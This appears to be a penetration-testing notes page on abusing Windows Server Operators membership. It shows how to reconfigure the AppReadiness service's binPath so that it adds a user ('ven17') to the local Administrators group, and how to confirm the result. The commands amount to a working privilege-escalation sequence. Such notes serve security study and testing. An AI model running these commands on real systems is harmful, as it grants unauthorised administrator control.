# Server Operators

## <mark style="color:yellow;">About</mark>

<mark style="color:red;">**Server Operators**</mark> group allows members to <mark style="color:purple;">**administer Windows servers**</mark> without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.

Membership of this group confers the powerful <mark style="color:green;">`SeBackupPrivilege`</mark> and <mark style="color:green;">`SeRestorePrivilege`</mark> privileges and the ability to control local services.

As example we would use **AppReadiness** service because it has high privileges and starts as SYSTEM. But method could be used against other services too.

## <mark style="color:yellow;">Querying the Service</mark>

```powershell
C:\> sc.exe qc AppReadiness
```

## <mark style="color:yellow;">Checking Service Permissions with PsService</mark>

```powershell
C:\> c:\Tools\PsService.exe security AppReadiness
```

## <mark style="color:yellow;">Modifying the Service Binary Path</mark>

```powershell
C:\> sc.exe config AppReadiness binPath= "cmd /c net localgroup Administrators ven17 /add"
```

## <mark style="color:yellow;">Starting the Service</mark>

```powershell
C:\> sc.exe start AppReadiness
```

## <mark style="color:yellow;">Confirming Local Admin Group Membership</mark>

```powershell
C:\> net localgroup Administrators
```
